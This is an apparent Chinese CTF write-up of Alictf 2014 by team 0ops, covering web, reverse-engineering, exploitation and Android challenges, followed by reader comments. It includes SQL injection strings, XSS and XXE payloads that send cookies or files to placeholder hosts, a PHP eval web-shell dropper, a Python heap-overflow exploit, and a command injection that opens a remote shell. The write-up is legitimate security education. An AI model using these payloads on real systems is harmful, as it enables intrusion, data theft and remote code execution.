@@ -1,0 +1,124 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Alictf2014 Writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Sasiki</a> <span class="bull">·</span> <time title="2014/10/08 15:24" ui-time="" datetime="2014/10/08 15:24" class="published ng-binding ng-isolate-scope">2014/10/08 15:24</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>Team Name: 0ops</p><p>ctf所有文件打包下载：<a href="http://static.wooyun.org/drops/20141005/Alictf.zip">Alictf.zip</a></p><h2>Part 1 BigData</h2><hr><h3>100pt</h3><p>因为是webshell,一般是post请求,但是经过检查所有post并无异常。这样,在get请求的情况下,可能会有关键字。 尝试eval,shell,hack,attack, evil,login,pass等关键字,发现可疑文件:</p><pre><code>config1.php?act=attack
+</code></pre><p>统计id可得答案。</p><h3>200pt</h3><p>连上服务器看到这是一个模拟两方通信的游戏,而玩家可以作为中间人篡改通信的消息。消息是由一串在Start与End之间由逗号分隔的数字组成的,根据数字的大小直接猜测其为十进制的ASCII码,解码后看到alice与bob互相交换了自己的RSA公钥,而后的通信就是用RSA算法“加密”过了。</p><p>这里与其说是“加密”还不如说是“编码”,因为之前交换的公钥的模数N实在太短,非常容易就可以分解,强度这么弱的RSA就跟编码差不太多了。然后解出之后的通信数据,<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7693f9e791f8c614191493f9e79ff6f792ccf092cef692cedc141914361419145815191b">[email&#160;protected]</a>,<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cb2d6b722d46652269532c5065236d4a2d7a4922574b236d4a2d50742d46692d435ba6aaa7a7a4b9b28ba6aaa7a7a4b9b2e5a8a4a6">[email&#160;protected]</a>,而后alice与bob会再度交换公钥,重复上述过程。</p><p>这里我因为想偷懒没有用分解N而后求d的方法,而是直接把双方在消息里发送的公钥的指数e从65537换成1,这样双方发送的消息就是明文了,而作为中 间人只是需要把修改后的消息用另一方真正的公钥再加密一次再发送即可,重复这样的过程许多次之后服务器就会把flag发送出来。</p><h2>Part 2 Web-A</h2><hr><h3>100pt</h3><p>根据提示是一个手工注入,常规的一些注入payload发觉都失效,所以一开始是感觉做了过滤。后来根据论文http://www.exploit-db.com/papers/18263/ 的提示(False Injection),尝试了</p><pre><code>Username: '-0||' / Password: 1
+</code></pre><p>发觉还是失败。于是猜测可能并不是做了过滤,而是做了硬编码,不能出现-,只能用|。 最终的payload为:</p><pre><code>￼Username: '|0||' / Password: 1
+</code></pre><p>即可拿到flag并提示web100b入口地址。</p><h3>200pt</h3><p>提交参数输出到onerror事件中,用js做了过滤,不能出现关键字,不能有“+”。 基础payload为</p><pre><code>￼window['location']="http://xxx/"+document['cookie']
+</code></pre><p>想到用字符拼接绕过关键字过滤,用</p><pre><code>￼'coo'['CONCAT'.toLowerCase()]('kie')
+</code></pre><p>这种方式绕过“+”,最终payload为</p><pre><code>"&gt;&lt;window['loca'['CONCAT'.toLowerCase()]('tion')]='http://xxx/'['CONCAT'.toLowerCase()](document['coo'['CONCAT'.toLowerCase()]('kie')]);&gt;
+</code></pre><p>url编码后提交得到flag。</p><h3>300pt</h3><p>根据题面猜测是XML实体注入。先找了一些中文网站的payload试了一下,发觉都不行,感觉主要原因是因为没有回显(结合题面的吐槽进一步确定 了)。于是开始Google。发现了这篇paper: <a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf</a>。</p><p>pdf里讲得很详细,有exploit可用。 网页上填写内容为: ￼￼￼</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM "http://ourserver_ip/xdb.xml"&gt;
+    %remote;
+    %param1; 
+]&gt;
+&lt;root&gt;&amp;external;&lt;/root&gt;
+</code></pre><p>￼xdb.xml的内容为:</p><pre><code>&lt;!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=bb.php"&gt; 
+&lt;!ENTITY % param1 "&lt;!ENTITY external SYSTEM 'http://ourserver_ip/log.php?msg=%payload;'&gt;"&gt;
+</code></pre><p>要注意的地方是,这里不能直接用file协议取bb.php的内容,因为绝对路径不确定感觉。所以采用php://filter以及base64-encode的trick。最后读到的msg 再base64_decode一下就出来flag了。</p><h3>400pt</h3><p>web400a就是抓包会看到一个文件上传的表单,上传文件后会给出上传后的路径和文件名,发现文件名与当前时间相关。 如/upload/upload/20140920170801.php。但是访问的时候会发现被删了。因此需要不断发生请求在被删之前访问到上传上去的脚本。脚本内容为在上一 级目录生成一句话。</p><pre><code>&lt;?php file_put_contents('../salt.php', '&lt;?php eval($_POST["c"]); ?&gt;'); ?&gt;
+</code></pre><p>然后在上级目录找到上传后的一句话,就可以菜刀连接了。 菜刀连上去之后发觉/home/wwwroot/default/upload目录下面有一个dfghjdjlkfghd.zip。但是有密码,所以一时之间束手无测。随后根据提示,要去 Github上进行查找。然后再根据之前curl连接的时候发觉返回结果有一个注释,大概是这个样子:</p><pre><code>&lt;!--
+    @author: nidongde
+--&gt;
+</code></pre><p>自然地,就去找nidongde的github主页,随后发现https://github.com/nidongde/test页面有解压缩密码: test_nidongde,解压之后得到一个php文件。提供了它的网址,以及一段内容,通过认证之后服务器会返回flag。条件:</p><pre><code>if($key == '_POST' &amp;&amp; ~$value['alibaba']['security'] == -2347230984235 &amp;&amp; strlen($value['alibaba']['security']) &gt;= 0){
+</code></pre><p>由于对GET、GLOBAL等做了过滤,所以就用POST方式传数据。一开始卡住了,因为发现弄不出足够大的整数取反之后符合要求,但是再根据提示要用 x64的思维。x64下面自然int类型是很大的。最后的payload如下:</p><pre><code>curl -d '_POST[alibaba][security]=2347230984234' -i 'http://web400b.alictf.com/alibaba_CTF_security/'
+</code></pre><p>即可得到flag。</p><h3>500pt</h3><p>页面最顶端js解密后为</p><pre><code>location.href.indexOf("helloalibaba")==-1&amp;&amp;(location.href="http://www.alictf.com/");
+</code></pre><p>即需要在url里有"helloalibaba",可以人为构造a= helloalibaba来绕过</p><p>经过测试,本题有两层过滤。</p><p>Php过滤单引号、双引号和“-”,防止逃逸出script标签。</p><p>Js主要过滤<code>&lt;</code>,并把所有字母变大写。</p><p>因为参数直接输出在<code>&lt;script&gt;</code>内,绕过php的过滤可用js的字符编码,变成\xff形式。</p><p>对js过滤,可以用<code>&lt;&lt;script&gt;&lt;/script&gt;</code>绕过。因为会把所有字母变大写,所以<code>&lt;script&gt;</code>标签里js代码中不能出现字母。在这里通过调用远程js代码来避免写这种js。</p><p>因此最终payload为</p><pre><code>&lt;&lt;script src=//xxx/1.js&gt;&lt;/script&gt;
+</code></pre><p>￼￼￼￼￼￼￼￼ ￼在linux服务器上创建1.JS文件,内容为</p><pre><code>p://xxx/xss.php?x='+document.cookie;
+</code></pre><p>提交得到flag。</p><h2>Part 3 Reverse</h2><hr><h3>100pt</h3><p>题目提示说会把信息加密存储到"secret.db"文件中,并且我们的目标是加密的key。那么很自然地,把ch1.exe拖进IDA之后,根据写内容到"secret.db"文 件来定位代码片段。IDA搜索text "secret.db"定位到函数sub_423400,看到了fopen,基本八九不离十了。</p><p>于是退到外面,看调用sub&#95;423400之前,发觉调用了函数sub&#95;4230f0,然后一进去,发现一连串非常可疑的赋值(从v19开始的),本着试一试的态 度,在0042325D下了一个断点(因为到这里一连串赋值结束了),然后用Ollydbg跑一下,从内存里直接把这连续的一段可见字符弄出来就好了,即是 flag。(根据一些常量字符串以及对数据的操作,加密方式应该是AES)。</p><h3>200pt</h3><p>根据题目的描述,是程序对输入的一段内容做了加密之后放到了flag.crypt文件。先要找到输入的途径,通过strings以及对程序稍稍调试,可以发现存放明 文的输入文件为flag.txt。</p><p>我们随便给flag.txt输入连续的123412341234,发觉出来的flag.crypt文件的hex内容为:</p><pre><code>A1 A2 A0 A3 9F A4 9E A5 A1 A2 A0 A3 9F A4 9E A5 A1 A2 A0 A3 9F A4 9E A5
+</code></pre><p>正好有循环段,猜测加密过程是1-1对应的替换,1个bytes变到2个bytes。接下来做一个简单的程序,把可见字符全部放到一个文件中,然后运行 ch2.exe。这样可以得到可见字符1-1对应的码表。接下来根据题目提供的flag.crypt文件的hex内容倒查这张表,即可获得明文(flag)。</p><h3>300pt</h3><p>程序下载下来先运行,发现点Find The Key之后就会崩溃。用IDA看,发现是加了UPX的壳,用UPX原版工具就可以直接脱壳。但是脱壳后程序就没法直接运行了,丢进IDA看到1400018C0这个函数会先加载一个DecryptDll.dll,然后执行其中的RSADecrypt函数,但是程序同目录下并没有这个dll所以直接运行会报错。</p><p>但是程序脱壳之前运行的话至少还会弹出来一个界面,脱了壳之后连界面都没了,这里面肯定还是有些问题。于是去看了下脱壳后的程序的资源区,发现里面就有一个dll,提取出来后重命名为DecryptDll.dll,再次运行程序,依然报错。</p><p>用windbg调试,发现程序还是在调用RSADecrypt的时候出了错,仔细检查这个函数调用,发现有四个参数,第一个是密文,第二个是密文长度,第三个是0,第四个是64,而程序崩溃是由于一个空指针引用,所以猜测第三个参数可能是解密后输出明文的buffer,第四个是明文buffer的长度。于是把第三个参数从0改成一个可写地址,再次执行这个函数,然后查看那个可写地址就会发现flag</p><h2>Part 4 Web-B</h2><hr><h3>100pt</h3><p>此题会检查referer和cookie。用web100a登陆后,发现cookie中有</p><pre><code>username=xbb; isadmin=0; sign=ZGYwMGVhNTZjNGQyZTcwOWRiYWNmMGVkZGYwMGVhNTY0NjliOWUzMA%3D%3D
+</code></pre><p>修改或者删除cookie中任意一项就会报错。显然sign对参数做了验证。</p><p>Sign base64解密后为一段40位的hash:df00ea56c4d2e709dbacf0eddf00ea56469b9e30 观察得hash中有重复部分。去掉头上重复部分剩32位,cmd5 上反查为xbb0。 正好是cookie中username和isadmin的拼接。</p><p>利用这个性质伪造cookie,</p><pre><code>username=admin; isadmin=1; sign=ZGY2NzhjNjFlMDBjZjI1YWQ0MjY4M2IzZGY2NzhjNjFmNDJjNmJkYQ==
+</code></pre><p>提交得到flag。</p><h3>200pt</h3><p>此题限定了开始部分,利用基础认证的形式,构造</p><pre><code>http://www.taobao.com:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1d796e795d6a787f2f2d2d7f337c71747e697b337e7270">[email&#160;protected]</a>/5.php
+</code></pre><p>得到flag。</p><h3>300pt</h3><p>页面打开后发现会载入whitehat.jpg,下载改后缀为rar,猜密码为www.alictf.com,得到提示*.php?img=exp。</p><p>又根据题目说在找不到的地方,查看robots.txt,得到两个隐藏页面。</p><p>upload.php可以用来上传文件,不过强制随机重名命名为jpg文件,内容并不检测。 flag.php为限制文件,只有admin能看到。</p><p>利用.php?img=exp可以构造出xss来,不过会被chrome自身的xss auditor拦截。 查看crossdomain.xml文件,发现<code>&lt;allow-access-from domain=""/&gt;</code> 这样本题就很明确为构造swf的xss。</p><p>参考http://www.freebuf.com/articles/web/37432.html 构造恶意swf文件,通过上传点上传。</p><p>本题php会检查提交的参数里有没有”/”,若存在则会忽略输入,可以用html编码为/绕过。</p><p>另外在接收flag.php内容的站点需要配置crossdomain.xml文件,内容同web300b的crossdomain.xml文件。 最终payload为</p><pre><code>￼"&gt;&lt;embed src="http:&amp;#47;&amp;#47;web300b.alictf.com&amp;#47;upload&amp;#47;A57yr8SGGfZKFSPHKrAGk0DYMETL6Aok.jpg"
+</code></pre><p>提交后记录flag用的脚本发现内容没有flag,注意到管理请求的referer为http://127.0.0.1开头,修改Swf读取的url指向http://127.0.0.1/flag.php,再次提交 得到flag。</p><h2>Part 5 CodeSafe</h2><h3>100pt</h3><p>大概浏览了一下是一个Linux提供RPC的程序,一共有3个functoin可以让你调用。漏洞发生在rpc&#95;function&#95;1,其中注意到: ￼</p><pre><code>mtl = temp.mtt * tl + 1; mt = (char*)malloc(mtl); 
+if(mt)
+{
+    strcpy(mt,temp.t);
+    for(i = 1;i &lt; temp.mtt;i++)
+￼￼￼￼￼￼}
+</code></pre><p>由于temp.mtt以及tl均为unsigned short类型并且均可控,所以构造数据可以使得两者乘法导致整形溢出,mtl会变得较小,于是申请的堆块区域会不足以 放得下传进来的数据,导致堆溢出。完整的exploit如下:</p><pre><code>#!python
+import struct
+import time
+import socket
+import telnetlib
+import random
+import sys
+
+def p(x):
+    return struct.pack('&lt;I', x)
+
+def netp(x):
+    return struct.pack('&gt;I', x)
+
+def shortp(x):
+    return struct.pack('&lt;H', x)
+
+def up(x):
+    return struct.unpack('&lt;I', x)[0]
+
+def readuntil(f, delim='msg?\n'): 
+    d = ''
+    while not d.endswith(delim): 
+        n = f.read(1)
+        if len(n) == 0: 
+            print 'EOF'
+            break 
+        d += n
+    return d[:-len(delim)]
+
+host = 'codesafe100.alictf.com' 
+port = 30000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+s.connect((host, port))
+f = s.makefile('rw', bufsize=0)
+
+token = '此处user_token' 
+
+temp = shortp(198)
+temp += 'A' * 512
+
+payload = chr(len(token)) # len_token 
+payload += token # token
+payload += chr(1) # function_id 
+payload += netp(len(temp)) # len_data 
+payload += temp
+
+f.write(payload)
+
+t = telnetlib.Telnet() 
+t.sock = s 
+t.interact()
+</code></pre><p>￼￼ ￼￼￼￼###200pt</p><p>在rpc&#95;function&#95;2里,看到最后有一句:</p><pre><code>sprintf(buffer,"%s has been parsed, tag:%s, value:%s.", line, pr.t, pr.v); 
+</code></pre><p>这里隐约就有一些不好的味道了,再翻 到函数的开头仔细检查下buffer的长度,是512字节,而后面的参数里的line就是request->data,长度&lt;=512。所以这里的sprintf是可以造成buffer溢出 的,剩下的只是要让程序的逻辑能够走到这一句语句即可。</p><p>根据前面的代码分析,提交的line需要满足形如”a = b”这样的格式,并且b需要使得function0返回一个非0值。再根据阅读function0的代码,能够知道b需 要是一个长度为16的仅由数字组成的字符串,经过后面的一系列运算后需要使得s % 10 == 0这个判断为真,而b只要为16个0就可以满足条件,所以最终 提交的line为</p><pre><code>￼line = 'huihui=' + ('0'*16).rjust(512-7-1, ' ') + '\n'
+</code></pre><p>即可触发漏洞。</p><h3>300pt</h3><p>上来先大概看了一遍,没看到什么特别的明显的问题,再仔细从rpc&#95;function&#95;0开始看,看到rpc&#95;function&#95;2的后半部分的时候又看到一个sprintf:</p><pre><code>￼sprintf(r,"/temporary folder/2014-08/%s",p);
+</code></pre><p>其中<code>r = (char*)malloc(256);</code></p><p>而p是function6的一个输出,function6的功能是从url中提取host,port和path信息,p就是url中的路径,url的长度限制也为256,且需要以 ￼http://alibaba.com/开头所以p长度最多为236,但是加上"/temporary folder/2014-08/"之后就可以往r里输出262个字节,导致堆溢出。</p><p>再从头看一遍rpc&#95;function&#95;2的代码,要触发漏洞需要过程序前面的一些条件判断,比如</p><pre><code>nm = 0x4848
+ts = time.time() + 999
+</code></pre><p>而k需要过一个function4之后与”alibaba-inc”相等,看一下代码就发现function4是凯撒密码,偏移是010也就是八进制的10也就是十进制的8,所以做一下反向偏移的凯撒加密就得到</p><pre><code>k = 'sdatsts-afu'.ljust(16, '\x00')
+v=2
+url_len = 255
+url = 'http://alibaba.com/'.ljust(255, 'p') + '\x00'
+</code></pre><p>即可。</p><p>这里还可能会有的问题的地方就是time_t了,在32位下是unsigned int,大小是4字节;而在64位下是unsigned long long,大小是8字节。本地测试的时候 还发现,如果是64位的话这个struct stc的内部结构可能还会有一些对齐方面的问题。经过测试服务器上的程序是32位的,不会有64位上的对齐问题。</p><h3>400pt</h3><p>这个程序非常诡异的在rpc&#95;function&#95;1里有调用system函数:</p><pre><code>char cbuffer[512];
+snprintf(cbuffer, 512,"ping %s",temp.buffer); 
+system(cbuffer);
+</code></pre><p>这里temp.buffer的长度限制为256,而cbuffer为512,所以不会有溢出。但是后面这个system真是让人醉了,看起来好像是在执行ping,但是参数是用字 符串拼接起来的,只要里面有分号就可以造成命令注入,比如拼接上如下字符串 <code>'; /bin/sh&lt;&amp;9 &gt;&amp;9 2&gt;&amp;9'</code> 就可以在远端起一个shell。剩下的还是要过程序前面的逻辑的问题,粗看了下似乎需要用户名为admin才有执行命令的权限,而做口令判断的这个地方用到了function3,而function3实际上是弗吉尼亚 密码,用admin登录时候的key就是”admin”,经过加密变换之后需要与”ALIBABA”相等,于是就可以构造好用户名和口令了,但是本地测试的时候却莫名 其妙地提示No privilege.感觉非常奇怪,于是就上gdb在校验密码的地方下了个断点,发现login变量先被赋值成1,而后又被赋值成0,非常诡异,而后再 去看代码,看到</p><pre><code>if(strcmp(value,"ALIBABA") == 0) 
+    login = 1;
+else
+    printf("%s login failed!",szUser); 
+    login = 0;
+</code></pre><p>这个真是醉了,else后面居然没加大括号!这个跟苹果之前被爆出的goto fail bug有异曲同工之处。这就导致了login = 0;这句赋值始终会被执行, 同时也就意味着admin永远无法登陆成功,难道这个system就是故意放着逗你玩的吗?再从头仔细看一遍代码,发现提交数据中的temp.user和temp.pass长度都是128,而用来做判断的szUser和szPass只取了前面63个字节,并且只是对temp.user用function1去掉了尾部的空格,并没有处理szUser和szPass,只是 在作为guest登录成功之后才会用function1处理一下szUser,而后的权限检查是判断这个处理过后的szUser是否等于"admin",所以可以构造这样一个</p><pre><code>user = 'admin'.ljust(64, ' ') + 'p'
+</code></pre><p>以guest的逻辑登录并且绕过admin的权限检查,最终的提交数据为</p><pre><code>user = 'admin'.ljust(64, ' ') + 'p' 
+hashval = 'alibaba'
+password = ''
+for i in xrange(len(hashval)):
+    c = chr((ord(hashval[i]) - ord('guest'[i%5])) % 26 + ord('a'))
+    password += c
+cmd = '; /bin/sh&lt;&amp;9 &gt;&amp;9 2&gt;&amp;9'
+data = user.ljust(128, '\x00') + password.ljust(128, '\x00') + cmd.ljust(256, '\x00')
+</code></pre><p>本地测试的时候可以成功开出shell,不过远程的服务器就只是返回了一个flag而已>_&lt;</p><h2>Part 6 EvilApk</h2><hr><h3>100pt</h3><p>反编译,在源码中就能看到文件的名称</p><h3>200pt</h3><p>反编译,通过搜索method的功能搜索sendSMS,得到次数。</p><h3>300pt</h3><p>根据题目描述,这里是考察android的webview漏洞。程序加了特殊的壳,不容易直接分析,但是如果要利用这个漏洞要知道在addJavascriptInterface里 触发漏洞时需要调用的对象是什么。 ￼￼￼￼￼￼￼￼￼ ￼这里用到了LoCCS实验室的安卓API监控工具,链接在https://github.com/romangol/InDroid。直接把apk扔进去跑,并一路记录apk调用的API。结果可以 发现进入addJavascriptInterface之后显示的对象名字叫做SmokeyBear。题目说要弹出一个Toast来获取flag。于是我们构造一个js文件,其中</p><pre><code>function execute() { SmokeyBear.showToast(); }
+</code></pre><p>尝试调用showToast方法来获得Toast里的内容,即flag。</p><h3>400pt</h3><p>这个apk程序同样也是加了特殊的壳,不能直接进行反汇编然后分析。于是再次使用LoCCS实验室的安卓API监控工具跑一下。可以看到在流程中,apk调 用了一些Java相关的加密函数,其中收集到的信息包括(Indroid可以进行API调用以及其具体参数是什么的收集):</p><pre><code>算法:DESede
+key:1f 98 ce ab 20 97 70 ef a8 75 c2 45 85 3e ce 76 1f 98 ce ab 20 97 70 ef 
+IV: 00 0a 0a 0a 0a 02 02 aa
+分组模式:CBC
+Padding模式:PKC5
+</code></pre><p>加密之后,同000a0a0a0a0202aa5458d715704493d8e6b9bd38f8b6be0e进行比较。去掉前面的IV,后面就是密文。 由于整个信息非常齐全,所以可以写一个解密程序最后结果是(hex):</p><pre><code>697A5E5A4A940E59C9FE4BEB8
+</code></pre><p>将其转成中文编码可得到flag。</p><h3>500pt</h3><p>题目里给了一个so,丢进IDA看到一大堆函数,用readelf发现有JNI_OnLoad这个函数,丢进IDA看,发现很多函数里都有switch的结构,估计是都做了控 制流混淆了,查看程序中的字符串也只看到一大堆的奇怪字符串,猜测是加过密了。尝试写一个APK去调用这个so进行动态调试,但是一直都没有成功, 所以刚开始的时候毫无头绪。 后来看到题目里给了提示是/proc/%pid%/下的某个文件,然后就决定既然动态分析一直不成功的话不如尝试一下静态分析,虽然代码有混淆但还不算是 特别严重,特别观察文件打开相关库函数(open、fopen)的参数,发现路径名会用sprintf来生成,并且再往前看发现有getpid的调用,于是就猜测程序是先 生成一个类似/proc/%d/xxxx这样的字符串,再用sprintf把pid代入生成最终的路径名,而且字符串解密的函数也就在附近,解密算法也不是非常复杂,但 是不同的字符串用的解密算法是不同的,稍微感觉有些蛋疼。</p><p>我们先找到了一个/proc/%d/cmdline,提交了不对,只能继续再寻找,最后找到了一个/proc/%d/stat,对应的解密算法在51624附近</p><pre><code>byte_1011E8[v1] = 0xCF * byte_E68CA[v1] - 0x6A - (0x9E * byte_E68CA[v1] &amp; 0x2C);
+</code></pre><p>对应密文在E68CA处</p><pre><code>0xF7, 0x3A, 0xDC, 0xB7, 0xFB, 0xF7, 0xDD, 0x6E, 0xF7,0xB, 0x7E, 0x59, 0x7E
+</code></pre><p>运气较好,尝试提交后通过。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/4070" rel="bookmark" id="re1">HCTF writeup(web)</a></li><li><a href="http://drops.wooyun.org/tips/2671" rel="bookmark" id="re2">无声杯 xss 挑战赛 writeup</a></li><li><a href="http://drops.wooyun.org/tips/3420" rel="bookmark" id="re3">Hack.lu 2014 Writeup</a></li><li><a href="http://drops.wooyun.org/tips/4243" rel="bookmark" id="re4">SCTF-WriteUp</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0ps</span> <span class="reply-time">2014-10-09 10:40:49</span></div><p></p><p>漂亮</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">redrain有节操</span> <span class="reply-time">2014-10-09 10:01:18</span></div><p></p><p>http://www.hackdog.me/writeup/alictf.html<br>大牛们带我飞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">3xpl0it</span> <span class="reply-time">2014-10-08 21:35:28</span></div><p></p><p>大牛我帮你肥皂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小白</span> <span class="reply-time">2014-10-08 20:26:52</span></div><p></p><p>大牛你肥皂掉了，我帮你捡起来</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">木黄彳亍</span> <span class="reply-time">2014-10-08 18:52:02</span></div><p></p><p>这个醉了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2014-10-08 18:30:40</span></div><p></p><p>这个学习了。。</p><p></p></div></div></div></div></div></main>
